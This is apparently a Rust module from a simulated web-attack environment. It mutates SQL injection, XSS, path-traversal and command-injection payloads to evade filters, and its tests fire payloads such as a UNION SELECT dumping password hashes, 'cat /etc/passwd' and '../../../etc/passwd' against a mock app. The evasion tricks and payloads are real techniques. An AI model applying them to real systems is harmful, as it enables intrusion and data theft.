//! Evasion mutations. Each keeps the payload's meaning for the class it applies to (that is
//! the attacker's knowledge), except a few classics that real attackers try and that break
//! on this app (double encoding, backslashes, overlong UTF-8): the attacker learns that
//! from the responses.

use super::encode::{Attempt, Delivery, Encoding};
use crate::Vuln;
use crate::rng::Rng;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum Op {
    // where and how it is sent
    EncodeSpecials,
    EncodeAll,
    DoubleEncode,
    ToForm,
    ToJson,
    ToJsonAsText,
    ToMultipart,
    ToCookie,
    Pollute,
    JsonUnicode,
    // SQL
    SqlCase,
    SqlCommentSpaces,
    SqlWhitespace,
    SqlVersionedComment,
    SqlSymbols,
    SqlTautology,
    SqlTerminator,
    // XSS
    XssCase,
    XssSlash,
    XssEntities,
    XssJs,
    XssScheme,
    // path traversal
    TravDotSlash,
    TravDoubleSlash,
    TravDepth,
    TravBackslash,
    // command injection
    CmdQuotes,
    CmdIfs,
    CmdGlob,
    CmdAbsPath,
    CmdEmptyVar,
    CmdSeparator,
}

use Op::*;

pub const ALL: &[Op] = &[
    EncodeSpecials,
    EncodeAll,
    DoubleEncode,
    ToForm,
    ToJson,
    ToJsonAsText,
    ToMultipart,
    ToCookie,
    Pollute,
    JsonUnicode,
    SqlCase,
    SqlCommentSpaces,
    SqlWhitespace,
    SqlVersionedComment,
    SqlSymbols,
    SqlTautology,
    SqlTerminator,
    XssCase,
    XssSlash,
    XssEntities,
    XssJs,
    XssScheme,
    TravDotSlash,
    TravDoubleSlash,
    TravDepth,
    TravBackslash,
    CmdQuotes,
    CmdIfs,
    CmdGlob,
    CmdAbsPath,
    CmdEmptyVar,
    CmdSeparator,
];

impl Op {
    pub fn as_str(self) -> &'static str {
        match self {
            EncodeSpecials => "encode-specials",
            EncodeAll => "encode-all",
            DoubleEncode => "double-encode",
            ToForm => "to-form",
            ToJson => "to-json",
            ToJsonAsText => "to-json-as-text",
            ToMultipart => "to-multipart",
            ToCookie => "to-cookie",
            Pollute => "param-pollution",
            JsonUnicode => "json-unicode",
            SqlCase => "sql-case",
            SqlCommentSpaces => "sql-comment-spaces",
            SqlWhitespace => "sql-whitespace",
            SqlVersionedComment => "sql-versioned-comment",
            SqlSymbols => "sql-symbols",
            SqlTautology => "sql-tautology",
            SqlTerminator => "sql-terminator",
            XssCase => "xss-case",
            XssSlash => "xss-slash",
            XssEntities => "xss-entities",
            XssJs => "xss-js",
            XssScheme => "xss-scheme",
            TravDotSlash => "trav-dot-slash",
            TravDoubleSlash => "trav-double-slash",
            TravDepth => "trav-depth",
            TravBackslash => "trav-backslash",
            CmdQuotes => "cmd-quotes",
            CmdIfs => "cmd-ifs",
            CmdGlob => "cmd-glob",
            CmdAbsPath => "cmd-abs-path",
            CmdEmptyVar => "cmd-empty-var",
            CmdSeparator => "cmd-separator",
        }
    }

    pub fn applies_to(self, v: Vuln) -> bool {
        let name = self.as_str();
        // a reflected XSS must reach a victim: a link or a cross-site form, not a cookie
        // or an `application/json` body
        if v == Vuln::Xss && matches!(self, ToCookie | ToJson | JsonUnicode) {
            return false;
        }
        match v {
            Vuln::Sqli => {
                !name.starts_with("xss") && !name.starts_with("trav") && !name.starts_with("cmd")
            }
            Vuln::Xss => {
                !name.starts_with("sql") && !name.starts_with("trav") && !name.starts_with("cmd")
            }
            Vuln::Traversal => {
                !name.starts_with("sql") && !name.starts_with("xss") && !name.starts_with("cmd")
            }
            Vuln::Cmdi => {
                !name.starts_with("sql") && !name.starts_with("xss") && !name.starts_with("trav")
            }
            Vuln::Bola | Vuln::BruteForce => false,
        }
    }

    /// Mutations of the same group replace each other: a chain uses one of each.
    pub fn group(self) -> Option<&'static str> {
        match self {
            ToForm | ToJson | ToJsonAsText | ToMultipart | ToCookie | Pollute => Some("delivery"),
            EncodeSpecials | EncodeAll | DoubleEncode => Some("encoding"),
            _ => None,
        }
    }

    /// A prior weight: how promising the attacker thinks the mutation is before trying it.
    pub fn prior(self) -> f64 {
        match self {
            DoubleEncode | TravBackslash => 0.3,
            ToCookie | Pollute | ToJsonAsText | JsonUnicode => 0.8,
            _ => 1.0,
        }
    }

    /// Applies the mutation; `false` when it doesn't fit this payload (nothing changed).
    pub fn apply(self, a: &mut Attempt, rng: &mut Rng) -> bool {
        let before = a.clone();
        match self {
            EncodeSpecials | EncodeAll | DoubleEncode => {
                if matches!(
                    a.delivery,
                    Delivery::Json | Delivery::JsonAsText | Delivery::Multipart
                ) {
                    return false;
                }
                a.encoding = match self {
                    EncodeSpecials => Encoding::Specials,
                    EncodeAll => Encoding::All,
                    _ => Encoding::Double,
                };
            }
            ToForm => a.delivery = Delivery::Form,
            ToJson => a.delivery = Delivery::Json,
            ToJsonAsText => a.delivery = Delivery::JsonAsText,
            ToMultipart => a.delivery = Delivery::Multipart,
            ToCookie => a.delivery = Delivery::Cookie,
            Pollute => a.delivery = Delivery::PollutedQuery,
            JsonUnicode => {
                if !matches!(a.delivery, Delivery::Json | Delivery::JsonAsText) {
                    return false;
                }
                a.json_unicode = true;
            }
            SqlCase => a.value = sql_case(&a.value, rng),
            SqlCommentSpaces => {
                a.value =
                    keep_terminator(&a.value, |v| outside_quotes(v, |s| s.replace(' ', "/**/")));
            }
            SqlWhitespace => {
                let ws = *rng.pick(&["\t", "\n", "\r", "\x0b", "\x0c", "\n\t"]);
                a.value = keep_terminator(&a.value, |v| outside_quotes(v, |s| s.replace(' ', ws)));
            }
            SqlVersionedComment => a.value = sql_versioned(&a.value),
            SqlSymbols => {
                a.value = replace_words(&a.value, &[("or", "||"), ("and", "&&")]);
            }
            SqlTautology => a.value = sql_tautology(&a.value, rng),
            SqlTerminator => {
                let base = strip_sql_terminator(&a.value);
                let t = *rng.pick(&["-- -", "#", "-- ", ";", "/*!*/", ""]);
                a.value = format!("{base}{t}");
            }
            XssCase => a.value = xss_case(&a.value, rng),
            XssSlash => a.value = xss_slash(&a.value),
            XssEntities => a.value = xss_entities(&a.value),
            XssJs => a.value = xss_js(&a.value, rng),
            XssScheme => a.value = xss_scheme(&a.value, rng),
            TravDotSlash => a.value = a.value.replacen("../", ".././", 2),
            TravDoubleSlash => a.value = a.value.replace("../", "..//"),
            TravDepth => a.value = format!("../../../{}", a.value),
            TravBackslash => a.value = a.value.replace('/', "\\"),
            CmdQuotes => a.value = cmd_words(&a.value, |w| quote_inside(w, rng)),
            CmdIfs => {
                let ifs = *rng.pick(&["${IFS}", "$IFS$9", "\t"]);
                a.value = cmd_command_part(&a.value, |c| c.replace(' ', ifs));
            }
            CmdGlob => a.value = cmd_words(&a.value, glob_word),
            CmdAbsPath => a.value = cmd_words(&a.value, abs_path),
            CmdEmptyVar => a.value = cmd_words(&a.value, |w| empty_var(w, rng)),
            CmdSeparator => a.value = cmd_separator(&a.value, rng),
        }
        *a != before
    }
}

/// Applies `f` to the parts of `s` outside SQL string literals.
fn outside_quotes(s: &str, mut f: impl FnMut(&str) -> String) -> String {
    let mut out = String::new();
    let mut chunk = String::new();
    let mut quote: Option<char> = None;
    for c in s.chars() {
        match quote {
            Some(q) => {
                out.push(c);
                if c == q {
                    quote = None;
                }
            }
            None if c == '\'' || c == '"' => {
                out.push_str(&f(&chunk));
                chunk.clear();
                out.push(c);
                quote = Some(c);
            }
            None => chunk.push(c),
        }
    }
    out.push_str(&f(&chunk));
    out
}

const SQL_KEYWORDS: &[&str] = &[
    "select", "union", "all", "from", "where", "or", "and", "not", "null", "like", "order", "by",
    "limit", "true", "concat", "hidden",
];

fn is_word_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_'
}

/// Replaces whole words (case-insensitively), outside string literals.
fn replace_words(s: &str, pairs: &[(&str, &str)]) -> String {
    outside_quotes(s, |chunk| {
        let mut out = String::new();
        let mut word = String::new();
        let flush = |word: &mut String, out: &mut String| {
            let lower = word.to_ascii_lowercase();
            match pairs.iter().find(|(w, _)| *w == lower) {
                Some((_, r)) => out.push_str(r),
                None => out.push_str(word),
            }
            word.clear();
        };
        for c in chunk.chars() {
            if is_word_char(c) {
                word.push(c);
            } else {
                flush(&mut word, &mut out);
                out.push(c);
            }
        }
        flush(&mut word, &mut out);
        out
    })
}

fn random_case(w: &str, rng: &mut Rng) -> String {
    let s: String = w
        .chars()
        .map(|c| {
            if rng.chance(0.5) {
                c.to_ascii_uppercase()
            } else {
                c.to_ascii_lowercase()
            }
        })
        .collect();
    if s == w { w.to_ascii_uppercase() } else { s }
}

fn sql_case(s: &str, rng: &mut Rng) -> String {
    // keywords only: table names are case-sensitive on Linux
    outside_quotes(s, |chunk| {
        let mut out = String::new();
        let mut word = String::new();
        let flush = |word: &mut String, out: &mut String, rng: &mut Rng| {
            if SQL_KEYWORDS.contains(&word.to_ascii_lowercase().as_str()) {
                out.push_str(&random_case(word, rng));
            } else {
                out.push_str(word);
            }
            word.clear();
        };
        let mut r = rng.fork();
        for c in chunk.chars() {
            if is_word_char(c) {
                word.push(c);
            } else {
                flush(&mut word, &mut out, &mut r);
                out.push(c);
            }
        }
        flush(&mut word, &mut out, &mut r);
        out
    })
}

fn sql_versioned(s: &str) -> String {
    outside_quotes(s, |chunk| {
        let mut out = String::new();
        let mut word = String::new();
        let flush = |word: &mut String, out: &mut String| {
            if ["union", "select", "or", "from"].contains(&word.to_ascii_lowercase().as_str()) {
                out.push_str(&format!("/*!50000{word}*/"));
            } else {
                out.push_str(word);
            }
            word.clear();
        };
        for c in chunk.chars() {
            if is_word_char(c) {
                word.push(c);
            } else {
                flush(&mut word, &mut out);
                out.push(c);
            }
        }
        flush(&mut word, &mut out);
        out
    })
}

fn sql_tautology(s: &str, rng: &mut Rng) -> String {
    const SAME: &[&str] = &[
        "2>1",
        "'a'='a'",
        "1 LIKE 1",
        "NOT 0",
        "1<=>1",
        "true",
        "0x41=0x41",
        "3 BETWEEN 1 AND 5",
        "1 IN (1)",
        "ascii('a')=97",
    ];
    for t in ["1=1", "2>1", "true"] {
        if let Some(i) = s.find(t) {
            let r = *rng.pick(SAME);
            return format!("{}{r}{}", &s[..i], &s[i + t.len()..]);
        }
    }
    s.to_string()
}

/// Applies `f` to the payload without its trailing comment terminator (`-- -` needs its
/// space), then puts the terminator back.
fn keep_terminator(s: &str, f: impl Fn(&str) -> String) -> String {
    let base = strip_sql_terminator(s);
    format!("{}{}", f(base), &s[base.len()..])
}

fn strip_sql_terminator(s: &str) -> &str {
    for t in ["-- -", "-- ", "#", ";", "/*!*/"] {
        if let Some(x) = s.strip_suffix(t) {
            return x;
        }
    }
    s
}

/// Applies `f` to the tag and attribute names inside `<…>`.
fn xss_names(s: &str, mut f: impl FnMut(&str) -> String) -> String {
    let mut out = String::new();
    let mut i = 0;
    let b = s.as_bytes();
    while i < b.len() {
        if b[i] == b'<'
            && b.get(i + 1)
                .is_some_and(|c| c.is_ascii_alphabetic() || *c == b'/')
        {
            let end = s[i..].find('>').map_or(s.len(), |e| i + e);
            let tag = &s[i..end];
            // names: runs of letters before `=` or at the tag start
            let mut t = String::new();
            let mut word = String::new();
            let mut in_value = false;
            let mut quote: Option<char> = None;
            for c in tag.chars() {
                if let Some(q) = quote {
                    t.push(c);
                    if c == q {
                        quote = None;
                        in_value = false;
                    }
                    continue;
                }
                if in_value {
                    if c == '"' || c == '\'' {
                        quote = Some(c);
                        t.push(c);
                        continue;
                    }
                    if c == ' ' || c == '/' {
                        in_value = false;
                    }
                    t.push(c);
                    continue;
                }
                if c.is_ascii_alphabetic() {
                    word.push(c);
                    continue;
                }
                if !word.is_empty() {
                    t.push_str(&f(&word));
                    word.clear();
                }
                if c == '=' {
                    in_value = true;
                }
                t.push(c);
            }
            if !word.is_empty() {
                t.push_str(&f(&word));
            }
            out.push_str(&t);
            i = end;
        } else {
            let ch = s[i..].chars().next().expect("char");
            out.push(ch);
            i += ch.len_utf8();
        }
    }
    out
}

fn xss_case(s: &str, rng: &mut Rng) -> String {
    xss_names(s, |w| random_case(w, rng))
}

fn xss_slash(s: &str) -> String {
    // `<svg onload=…>` → `<svg/onload=…>` (only the first space in each tag)
    let mut out = String::new();
    let mut in_tag_name = false;
    for c in s.chars() {
        if c == '<' {
            in_tag_name = true;
            out.push(c);
            continue;
        }
        if in_tag_name && c == ' ' {
            out.push('/');
            in_tag_name = false;
            continue;
        }
        if !c.is_ascii_alphanumeric() {
            in_tag_name = false;
        }
        out.push(c);
    }
    out
}

/// HTML-entity-encodes the first letters of `alert` / `confirm` / `prompt` / `javascript`
/// inside attribute values (browsers decode them).
fn xss_entities(s: &str) -> String {
    // inside `<script>` entities are not decoded: leave those alone
    if s.to_ascii_lowercase().contains("<script") {
        return s.to_string();
    }
    let mut out = s.to_string();
    for (word, ent) in [
        ("alert", "&#97;lert"),
        ("confirm", "&#x63;onfirm"),
        ("prompt", "&#112;rompt"),
        ("javascript:", "&#106;avascript&colon;"),
    ] {
        out = out.replace(word, ent);
    }
    out
}

fn xss_js(s: &str, rng: &mut Rng) -> String {
    let alts = [
        "alert`1`",
        "top['al'+'ert'](1)",
        "window['alert'](1)",
        "(alert)(1)",
        "[1].find(alert)",
        "confirm(1)",
        "prompt(1)",
        "self[atob('YWxlcnQ=')](1)",
        "eval('ale'+'rt(1)')",
        "setTimeout('alert(1)')",
    ];
    for f in ["alert(1)", "confirm(1)", "prompt(1)"] {
        if s.contains(f) {
            let alt = *rng.pick(&alts);
            return s.replacen(f, alt, 1);
        }
    }
    s.to_string()
}

fn xss_scheme(s: &str, rng: &mut Rng) -> String {
    let alts = [
        "java&#x09;script:",
        "&#106;avascript:",
        "JaVaScRiPt:",
        " javascript:",
        "java&Tab;script:",
        "javas&#99;ript:",
    ];
    if s.contains("javascript:") {
        let alt = *rng.pick(&alts);
        s.replacen("javascript:", alt, 1)
    } else {
        s.to_string()
    }
}

/// Splits a command-injection payload into (prefix up to the first separator, the
/// injected command part, suffix such as a trailing `#`).
fn cmd_split(s: &str) -> (String, String, String) {
    for sep in ["&&", "||", ";", "|", "&", "\n", "$(", "`"] {
        if let Some(i) = s.find(sep) {
            let (pre, rest) = s.split_at(i + sep.len());
            let (cmd, suf) = match rest.rfind(" #") {
                Some(k) => rest.split_at(k),
                None => (rest, ""),
            };
            let (cmd, close) = if sep == "$(" {
                match cmd.rfind(')') {
                    Some(k) => cmd.split_at(k),
                    None => (cmd, ""),
                }
            } else if sep == "`" {
                match cmd.rfind('`') {
                    Some(k) => cmd.split_at(k),
                    None => (cmd, ""),
                }
            } else {
                (cmd, "")
            };
            return (pre.to_string(), cmd.to_string(), format!("{close}{suf}"));
        }
    }
    (String::new(), s.to_string(), String::new())
}

fn cmd_command_part(s: &str, f: impl Fn(&str) -> String) -> String {
    let (pre, cmd, suf) = cmd_split(s);
    // keep a leading space after the separator as it is
    let lead = cmd.len() - cmd.trim_start().len();
    format!("{pre}{}{}{suf}", &cmd[..lead], f(&cmd[lead..]))
}

/// Applies `f` to each word of the injected command.
fn cmd_words(s: &str, mut f: impl FnMut(&str) -> String) -> String {
    let (pre, cmd, suf) = cmd_split(s);
    let mut out = String::new();
    for (i, w) in cmd.split(' ').enumerate() {
        if i > 0 {
            out.push(' ');
        }
        if w.is_empty() || w.starts_with('-') || w.contains('$') {
            out.push_str(w);
        } else {
            out.push_str(&f(w));
        }
    }
    format!("{pre}{out}{suf}")
}

fn quote_inside(w: &str, rng: &mut Rng) -> String {
    if w.len() < 2 || w.contains(['\'', '"', '\\']) {
        return w.to_string();
    }
    let k = 1 + rng.below(w.len() - 1);
    match rng.below(3) {
        0 => format!("{}''{}", &w[..k], &w[k..]),
        1 => format!("{}\"\"{}", &w[..k], &w[k..]),
        _ => format!("{}\\{}", &w[..k], &w[k..]),
    }
}

fn glob_word(w: &str) -> String {
    let path = match w {
        "cat" => "/bin/cat",
        "id" => "/usr/bin/id",
        "whoami" => "/usr/bin/whoami",
        "uname" => "/bin/uname",
        "head" => "/usr/bin/head",
        p if p.starts_with('/') => p,
        other => return other.to_string(),
    };
    // replace every other letter of each component with `?`
    path.split('/')
        .map(|c| {
            c.chars()
                .enumerate()
                .map(|(i, ch)| {
                    if i % 2 == 1 && ch.is_ascii_alphabetic() {
                        '?'
                    } else {
                        ch
                    }
                })
                .collect::<String>()
        })
        .collect::<Vec<_>>()
        .join("/")
}

fn abs_path(w: &str) -> String {
    match w {
        "cat" | "ls" | "uname" | "echo" | "sleep" => format!("/bin/{w}"),
        "id" | "whoami" | "head" => format!("/usr/bin/{w}"),
        other => other.to_string(),
    }
}

fn empty_var(w: &str, rng: &mut Rng) -> String {
    if w.len() < 2 || w.starts_with('/') {
        return w.to_string();
    }
    let k = 1 + rng.below(w.len() - 1);
    let v = *rng.pick(&["$@", "${x}", "$9"]);
    format!("{}{v}{}", &w[..k], &w[k..])
}

fn cmd_separator(s: &str, rng: &mut Rng) -> String {
    let (pre, cmd, suf) = cmd_split(s);
    let cmd = cmd.trim();
    let suf = suf.trim_start_matches(['`', ')']);
    match rng.below(7) {
        0 => format!("127.0.0.1;{cmd}{suf}"),
        1 => format!("127.0.0.1\n{cmd}{suf}"),
        2 => format!("127.0.0.1 && {cmd}{suf}"),
        3 => format!("x || {cmd}{suf}"),
        4 => format!("127.0.0.1|{cmd}{suf}"),
        5 => format!("$({cmd}){suf}"),
        _ => {
            let _ = pre;
            format!("`{cmd}`{suf}")
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::app::{fs, shell, sql};
    use crate::attack::target;

    fn attempt(v: &str, vuln: Vuln) -> Attempt {
        Attempt::plain(v, target(vuln))
    }

    fn sql_leaks(v: &str) -> bool {
        sql::query(&format!(
            "SELECT name, price FROM products WHERE hidden = 0 AND id = {v}"
        ))
        .is_ok_and(|r| {
            r.rows.iter().flatten().any(|x| {
                let s = x.render();
                s.contains(crate::app::data::HIDDEN_PRODUCT)
                    || s.contains(crate::app::data::ADMIN_HASH)
            })
        })
    }

    #[test]
    fn sql_mutations_keep_the_injection_working() {
        let mut rng = Rng::new(3);
        for base in [
            "1 OR 1=1",
            "0 UNION SELECT username,password_hash FROM users-- -",
            "1 OR 'a'='a'",
        ] {
            for op in [
                SqlCase,
                SqlCommentSpaces,
                SqlWhitespace,
                SqlVersionedComment,
                SqlSymbols,
                SqlTautology,
                SqlTerminator,
            ] {
                for _ in 0..10 {
                    let mut a = attempt(base, Vuln::Sqli);
                    op.apply(&mut a, &mut rng);
                    assert!(sql_leaks(&a.value), "{op:?}: {base} → {}", a.value);
                }
            }
        }
    }

    #[test]
    fn cmd_mutations_keep_the_injection_working() {
        let mut rng = Rng::new(5);
        for base in [
            "127.0.0.1; id",
            "127.0.0.1 && cat /etc/passwd",
            "$(id)",
            "x || whoami",
        ] {
            for op in [
                CmdQuotes,
                CmdIfs,
                CmdGlob,
                CmdAbsPath,
                CmdEmptyVar,
                CmdSeparator,
            ] {
                for _ in 0..10 {
                    let mut a = attempt(base, Vuln::Cmdi);
                    op.apply(&mut a, &mut rng);
                    let out = shell::run(&format!("ping -c 1 {} 2>&1", a.value)).stdout;
                    let page = format!("<pre>{out}</pre>");
                    assert!(
                        crate::oracle::confirm("/tools/ping", 200, &page).is_some(),
                        "{op:?}: {base} → {:?} gave {out:?}",
                        a.value
                    );
                }
            }
        }
    }

    #[test]
    fn xss_mutations_keep_the_script_running() {
        let mut rng = Rng::new(9);
        for base in [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<a href=\"javascript:alert(1)\">x</a>",
            "\"><svg onload=alert(1)>",
            "<script>alert(1)</script>",
        ] {
            for op in [XssCase, XssSlash, XssEntities, XssJs, XssScheme] {
                for _ in 0..10 {
                    let mut a = attempt(base, Vuln::Xss);
                    op.apply(&mut a, &mut rng);
                    let page = crate::app::search_page(&a.value);
                    assert!(
                        crate::browser::script_runs(&page).is_some(),
                        "{op:?}: {base} → {}",
                        a.value
                    );
                }
            }
        }
    }

    #[test]
    fn traversal_mutations() {
        let mut rng = Rng::new(1);
        let base = "../../../etc/passwd";
        for (op, works) in [
            (TravDotSlash, true),
            (TravDoubleSlash, true),
            (TravDepth, true),
            (TravBackslash, false),
        ] {
            let mut a = attempt(base, Vuln::Traversal);
            op.apply(&mut a, &mut rng);
            let ok = fs::read("/", &format!("/srv/app/files/{}", a.value)).is_ok();
            assert_eq!(ok, works, "{op:?} → {}", a.value);
        }
    }

    #[test]
    fn transport_mutations_change_only_the_delivery() {
        let mut rng = Rng::new(2);
        let mut a = attempt("1 OR 1=1", Vuln::Sqli);
        assert!(ToJson.apply(&mut a, &mut rng));
        assert_eq!(a.delivery, Delivery::Json);
        assert!(
            !EncodeAll.apply(&mut a, &mut rng),
            "JSON bodies are not percent-encoded"
        );
        assert!(JsonUnicode.apply(&mut a, &mut rng));
        assert_eq!(a.value, "1 OR 1=1");
        let mut q = attempt("1 OR 1=1", Vuln::Sqli);
        assert!(!JsonUnicode.apply(&mut q, &mut rng), "only for JSON bodies");
        assert!(ALL.iter().all(|o| !o.applies_to(Vuln::Bola)));
        assert!(SqlCase.applies_to(Vuln::Sqli) && !SqlCase.applies_to(Vuln::Xss));
        assert!(!ToCookie.applies_to(Vuln::Xss) && ToCookie.applies_to(Vuln::Sqli));
        assert!(ToJsonAsText.applies_to(Vuln::Xss));
    }
}
